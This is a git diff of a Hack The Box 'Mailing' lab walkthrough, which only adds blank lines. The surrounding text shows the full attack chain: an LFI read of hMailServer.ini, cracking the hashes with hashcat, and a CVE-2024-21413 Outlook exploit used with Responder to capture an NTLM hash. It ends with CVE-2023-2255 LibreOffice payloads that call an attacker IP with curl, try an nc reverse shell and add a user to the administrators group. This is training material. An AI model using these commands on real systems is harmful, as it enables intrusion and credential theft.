@@ -23,6 +23,7 @@ Add mailing.htb to /etc/hosts
 ![image2](../resources/d1af18942afe4d62876e16ad7234fdd9.png)
 
 - Try and get to the hosts file:
+
 ```bash
 C:\Windows\System32\drivers\etc\hosts
 
@@ -38,6 +39,7 @@ C:\Windows\System32\drivers\etc\hosts
 - We have a LFI vulnerability
 
 - We know that hMailServer is running and the config file for it is in:
+
 ```bash
 C:\Program Files\hMailServer\Bin\hMailServer.ini
 
@@ -48,6 +50,7 @@ But that didn't work:
 ![image5](../resources/8274244457eb4bc58395c6bdc43e246b.png)
 
 - We can try and do:
+
 ```bash
 C:\Program Files(x86)\hMailServer\Bin\hMailServer.ini
 
@@ -70,6 +73,7 @@ Password=0a9f8ad8bf896b501dde74f08efd7e4c
 ![image7](../resources/34bf7a31fc4a47baa6194267a2136167.png)
 
 - Crack with hashcat:
+
 ```bash
 hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
 
@@ -92,6 +96,7 @@ hashcat -a 0 -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
 **6FC6F69152AD**
 
 - Tried logging in through SMTP - But it didn't work:
+
 ```bash
 telnet mailing.htb 25
 
@@ -106,6 +111,7 @@ AUTH LOGIN
 ```
 
 - Log in through POP3 - worked but nothing there:
+
 ```bash
 telnet mailing.htb 110
 
@@ -118,11 +124,13 @@ PASS homenetworkingadministrator
 <https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability>
 
 - Set up Responder:
+
 ```bash
 Responder -I tun0
 ```
 
 - And send the following crafted payload (We get the recipient name from the homepage):
+
 ```bash
 python3 CVE-2024-21413.py --server "mailing.htb" --port 587 --username "administrator@mailing.htb" --password "homenetworkingadministrator" --sender "Administrator@mailing.htb" --recipient "maya@mailing.htb" --url '\\10.10.14.15\meeting' --subject "Important"
 
@@ -135,6 +143,7 @@ python3 CVE-2024-21413.py --server "mailing.htb" --port 587 --username "administ
 ![image12](../resources/eb85a293e71c4aa790d69ded0b1cd183.png)
 
 - Crack with hashcat:
+
 ```bash
 hashcat -a 0 -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 
@@ -168,6 +177,7 @@ cat user.txt
 ![image17](../resources/543506c03d7a45618342b7b3ce72c4b5.png)
 
 - Looking at scheduled tasks:
+
 ```bash
 schtasks /query /fo LIST /v | select-string -pattern "localadmin" -context 9,13
 
@@ -182,6 +192,7 @@ We see an office script running under localadmin
 ![image19](../resources/205b31e287e1480d9ce4d4744a189648.png)
 
 - Get LibreOffice version:
+
 ```powershell
 $libreofficeInstallPath = "C:\Program Files\LibreOffice"
 $libreofficeVersion = (Get-Item "$libreofficeInstallPath\program\soffice.bin").VersionInfo.FileVersion
@@ -211,11 +222,13 @@ python3 CVE-2023-2255.py --cmd "curl <http://10.10.14.15:8000/a>" --output form.
 ![image23](../resources/1d34f984e26746dc8c4e10bce2faa711.png)
 
 - Uploading nc and trying to get a reverse shell didn't work because of AV:
+
 ```bash
 python3 CVE-2023-2255.py --cmd "C:\Important Documents\nc.exe 10.10.14.15 8000 -e cmd.exe" --output form.odt
 
 ```
 - So instead added maya to admin group:
+
 ```bash
 python3 CVE-2023-2255.py --cmd "net localgroup Administradores /add maya" --output form.odt
 
